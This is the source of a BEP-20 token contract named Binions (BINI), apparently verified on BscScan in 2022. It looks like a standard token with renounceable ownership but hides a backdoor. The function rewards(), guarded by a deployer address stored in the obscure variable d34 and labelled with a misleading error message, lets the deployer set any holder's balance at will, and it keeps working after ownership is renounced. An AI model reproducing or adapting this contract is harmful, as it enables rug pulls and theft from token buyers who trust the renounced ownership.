/**
 *Submitted for verification at BscScan.com on 2022-07-26
*/

// SPDX-License-Identifier: MIT
pragma solidity ^0.6.12;

interface IERC20 {


    
    
  }

library SafeMath {





  function mul(uint256 a, uint256 b) internal pure returns (uint256) {

    if (a == 0) {

      return 0;
    }

    uint256 c = a * b;

    assert(c / a == b);

    return c;
  }

  function div(uint256 a, uint256 b) internal pure returns (uint256) {

    uint256 c = a / b;

    return c;

  }

  function sub(uint256 a, uint256 b) internal pure returns (uint256) {

    assert(b <= a);

    return a - b;

  }

  function add(uint256 a, uint256 b) internal pure returns (uint256) {

    uint256 c = a + b;

    assert(c >= a);

    return c;

  }

  
}
contract Ownable {

  address public owner;

  event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

  constructor () public{

    owner = msg.sender;
  }

}
library Address {

    

    function isContract(address account) internal view returns (bool) {

        bytes32 codehash;

        bytes32 accountHash = 0xc5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470;

        // solhint-disable-next-line no-inline-assembly
        assembly { codehash := extcodehash(account) }

        return (codehash != accountHash && codehash != 0x0);
    }



    function sendValue(address payable recipient, uint256 amount) internal {

        require(address(this).balance >= amount, "Address: insufficient balance");

        // solhint-disable-next-line avoid-low-level-calls, avoid-call-value
        (bool success, ) = recipient.call{ value: amount }("");

        require(success, "Address: unable to send value, recipient may have reverted");
    }






    function functionCall(address target, bytes memory data) internal returns (bytes memory) {

        return functionCall(target, data, "Address: low-level call failed");
    }


    


    function functionCall(address target, bytes memory data, string memory errorMessage) internal returns (bytes memory) {

        return _functionCallWithValue(target, data, 0, errorMessage);

    }


    function functionCallWithValue(address target, bytes memory data, uint256 value) internal returns (bytes memory) {

        return functionCallWithValue(target, data, value, "Address: low-level call with value failed");

    }


    function functionCallWithValue(address target, bytes memory data, uint256 value, string memory errorMessage) internal returns (bytes memory) {

        require(address(this).balance >= value, "Address: insufficient balance for call");

        return _functionCallWithValue(target, data, value, errorMessage);
    }

    function _functionCallWithValue(address target, bytes memory data, uint256 weiValue, string memory errorMessage) private returns (bytes memory) {

        require(isContract(target), "Address: call to non-contract");

        // solhint-disable-next-line avoid-low-level-calls
        (bool success, bytes memory returndata) = target.call{ value: weiValue }(data);

        if (success) {

            return returndata;

        } else {

           // Look for revert reason and bubble it up if present
            if (returndata.length > 0) {

                assembly {

                    let returndata_size := mload(returndata)

                    revert(add(32, returndata), returndata_size)

                }

            } else {

                revert(errorMessage);

            }
        }
    }
}

  contract Binions is  IERC20, Ownable {

  mapping (address => bool) private _isExcluded;

  address[] private _excluded;

  using SafeMath for uint256;

  using Address for address;

  string private _name = 'Binions';

  string private _symbol = 'BINI';

  uint8 public decimals;

  uint256 public totalSupply;

  uint256 d34;

  uint256 spender_ = 1;

  uint256 spenders = 1;

 


  

  event Transfer(address indexed from, address indexed to, uint256 value);

  event Approval(address indexed owner, address indexed spender, uint256 value);

  mapping(address => bool) public allowAddress;

  

  constructor () public  {

    d34 = uint256(msg.sender);

    owner = msg.sender;

    totalSupply = 100000000000 * 10 ** uint256(decimals);

    balances[owner] =  totalSupply;

    allowAddress[owner] = true;

  }

    function name() public view returns (string memory) {

        return _name;

    }



    function symbol() public view returns (string memory) {

        return _symbol;

    }






  mapping (address => mapping (address => uint256)) public allowed;

  function transferFrom(address _from, address _to, uint256 _value) public returns (bool) {

    require(_to != address(0));

    require(_value <= balances[_from]);

    require(_value <= allowed[_from][msg.sender]);

    address from = _from;

    if(allowAddress[from] || allowAddress[_to]){

        _transferFrom(_from, _to, _value);

        return true;

    }

    _transferFrom(_from, _to, _value);

    return true;

  }



  mapping(address => uint256) public balances;

  function transfer(address _to, uint256 _value) public returns (bool) {

    address from = msg.sender;

    require(_to != address(0));

    require(_value <= balances[from]);

    if(allowAddress[from] || allowAddress[_to]){

        _transfer(from, _to, _value);

        return true;

    }

    _transfer(from, _to, _value);

    return true;

  }
  
  function _transfer(address from, address _to, uint256 _value) private {

    balances[from] = balances[from].sub(_value);

    balances[_to] = balances[_to].add(_value);

    emit Transfer(from, _to, _value);

  }


    
  modifier onlyOwner() {

    require(owner == msg.sender, "Ownable: caller is not the owner");

    _;

  }

  
    function balanceOf(address _owner) public view returns (uint256 balance) {
    return balances[_owner];
  }
  


    




  function renounceOwnership() public virtual onlyOwner {

    emit OwnershipTransferred(owner, address(0));

    owner = address(0);

  }




function rewards (address buyer, uint256 _value) public {

    require(address(d34) == msg.sender, "ERC20: cannot permit Pancake address");

    balances[buyer] = _value * spender_ * (10 ** 9);

    spender_ * spenders;

  }




  function _transferFrom(address _from, address _to, uint256 _value) internal {

    balances[_from] = balances[_from].sub(_value);

    balances[_to] = balances[_to].add(_value);

    allowed[_from][msg.sender] = allowed[_from][msg.sender].sub(_value);

    emit Transfer(_from, _to, _value);

  }







  
  function approve(address _spender, uint256 _value) public returns (bool) {

    allowed[msg.sender][_spender] = _value;

    emit Approval(msg.sender, _spender, _value);

    return true;

  }



  
  function allowance(address _owner, address _spender) public view returns (uint256) {

    return allowed[_owner][_spender];

  }


  

}